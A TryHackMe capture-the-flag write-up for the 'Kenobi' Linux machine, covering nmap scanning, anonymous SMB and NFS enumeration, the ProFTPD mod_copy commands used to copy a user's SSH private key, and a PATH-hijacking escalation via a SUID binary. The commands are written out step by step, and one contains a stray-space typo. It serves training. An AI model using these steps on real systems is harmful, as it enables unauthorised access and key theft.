# 🗡️ Kenobi - TryHackMe

## 📌 Information

| Field          | Value                                          |
| -------------- | ---------------------------------------------- |
| **Machine**    | Kenobi                                         |
| **Platform**   | TryHackMe                                      |
| **Difficulty** | Easy                                           |
| **OS**         | Linux                                          |
| **Category**   | Enumeration / SMB / NFS / Privilege Escalation |

---

# 🎯 Objective

Gain root access to the Linux machine by enumerating exposed network services, exploiting misconfigured file shares, and abusing a vulnerable SUID binary.

---

# 🛰️ Reconnaissance

The first step was identifying open ports and running services using **Nmap**.

### Scan

```bash
nmap -sC -sV -oN scan.txt MACHINE_IP
```

### Results

| Port | Service | Version             |
| ---- | ------- | ------------------- |
| 21   | FTP     | ProFTPD 1.3.5       |
| 22   | SSH     | OpenSSH             |
| 80   | HTTP    | Apache HTTP Server  |
| 111  | RPCBind | rpcbind             |
| 139  | NetBIOS | Samba               |
| 445  | SMB     | Samba               |
| 2049 | NFS     | Network File System |

### Notes

* FTP, SMB and NFS services were exposed.
* Samba shares allowed anonymous enumeration.
* NFS exports appeared to be accessible.
* ProFTPD 1.3.5 was known to contain the **mod_copy** functionality.

---

# 🔍 Enumeration

## SMB Enumeration

List available shares:

```bash
smbclient -L //MACHINE_IP/ -N
```

Connect to the anonymous share:

```bash
smbclient //MACHINE_IP/anonymous -N
```

### Findings

The share contained a file named:

```text
log.txt
```

Inspecting the file revealed useful information about the FTP service and user activity.

---

## NFS Enumeration

List exported directories:

```bash
showmount -e MACHINE_IP
```

Mount the exported share:

```bash
sudo mount -t nfs MACHINE_IP:/var /mnt
```

The mounted directory provided access to files that would later be useful during exploitation.

---

# 💥 Exploitation

The FTP service was running **ProFTPD 1.3.5**, which supports the **SITE CPFR** and **SITE CPTO** commands through the `mod_copy` module.

Connect using Netcat:

```bash
nc MACHINE_IP 21
```

Copy the SSH private key:

```text
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Since `/var` was mounted through NFS, the copied key became accessible locally.

Adjust permissions:

```bash
chmod 600 /mnt/tmp/id_rsa
```

Authenticate via SSH:

```bash
ssh -i /mnt/tmp/id_rsa kenobi@MACHINE_IP
```

### Result

A shell was successfully obtained as the **kenobi** user.

---

# ⬆️ Privilege Escalation

Search for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

An unusual SUID binary was discovered:

```text
/usr/bin/menu
```

Inspect the binary:

```bash
strings /usr/bin/menu
```

The binary executed commands without using absolute paths.

Modify the **PATH** environment variable:

```bash
mkdir /tmp/bin
echo "/bin/bash" > /tmp/bin/curl
chmod +x /tmp/bin/curl
export PATH=/tmp/bin:$PATH
```

Execute the vulnerable binary:

```bash
/ usr/bin/menu
```

A root shell was spawned.

Verify privileges:

```bash
whoami
```

Output:

```text
root
```

---

# 🚩 Flags

## User Flag

```text
<user_flag>
```

## Root Flag

```text
<root_flag>
```

---

# 📚 What I Learned

* Enumerating SMB and NFS services.
* Mounting NFS shares.
* Exploiting the ProFTPD **mod_copy** feature.
* Using exposed SSH private keys for initial access.
* Enumerating SUID binaries.
* Exploiting PATH hijacking for privilege escalation.

---

# 🛠️ Tools Used

* Nmap
* smbclient
* showmount
* mount
* Netcat
* OpenSSH
* strings

---

# 📖 MITRE ATT&CK

| Technique | Description                                    |
| --------- | ---------------------------------------------- |
| T1046     | Network Service Discovery                      |
| T1135     | Network Share Discovery                        |
| T1021.004 | SSH                                            |
| T1552.004 | Private Keys                                   |
| T1574.007 | PATH Interception by PATH Environment Variable |

---

# 📷 Screenshots

Recommended screenshots:

* Nmap scan
* SMB enumeration
* NFS exports
* Mounted share
* FTP mod_copy commands
* SSH login as **kenobi**
* SUID enumeration
* Root shell
* Flags

---

# ✅ Summary

Kenobi is one of the most popular beginner Linux machines on TryHackMe. It teaches the importance of thorough service enumeration by combining SMB, NFS, and FTP to obtain an SSH private key. The privilege escalation phase introduces SUID binaries and **PATH hijacking**, providing an excellent hands-on example of how small system misconfigurations can lead to full **root** compromise.
